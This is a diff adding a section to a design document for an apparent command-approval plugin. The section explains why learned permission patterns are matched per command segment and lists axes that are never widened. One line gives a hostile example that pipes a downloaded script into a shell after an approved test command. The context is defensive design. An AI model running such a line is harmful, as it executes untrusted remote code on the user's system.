@@ -472,6 +472,35 @@ window, and **the gate never auto-proposes retirement of a red or orange.** It c
 initiates. A confident-looking zero on a safety clause is worse than no output, because it launders
 "I have no evidence" as "I have evidence of nothing".
 
+### 9. Generalisation widens the pattern, and per-segment matching is what makes that safe
+
+Generalising is the differentiator in §"unclaimed" item 5, and it is also the most dangerous thing
+here, so the guarantee that contains it belongs in this list rather than in an implementation note.
+
+**What we do differently.** First-party "don't ask again" persists the *literal* command line — for a
+compound line, per subcommand — so it never matches the next near-identical call, and the user is
+asked again. That is deliberate on their part and it is the opposite of learning. We instead widen to
+the narrowest pattern that covers the observed evidence: four approved `npm test` shapes become one
+clause, not four literals.
+
+**The hazard, concretely.** A green clause matching `pnpm test` must not license
+`pnpm test && curl x | sh`. This is not hypothetical. An earlier round of this work shipped a green
+clause that authorised a whole compound line, and it was found by **running the plugin, not by
+reading the diff** — which is the honest reason this subsection exists.
+
+**The guarantee.** Matching is **per-segment**. A compound line is split on its operators, every
+segment is judged independently, and the most restrictive verdict wins. A segment never inherits an
+approval earned by its siblings, so a green covering one segment leaves the rest exactly as
+unapproved as they were. The widening lattice reinforces it from the other side: certain axes are
+never widened at all — redirects, privilege escalation, network egress, paths outside the repo, and
+the policy directory itself.
+
+This is a **security property, not a nicety**: it is the difference between a learned green clause
+and an arbitrary-command allowlist, and it is a property of the *matcher*, which the pipeline can
+only require and not enforce. The seven widening levels and the coverage floors that go with them are
+in the extraction working spec (§6), and whoever implements the matcher should read it before
+touching either.
+
 ---
 
 ## The review plane, briefly
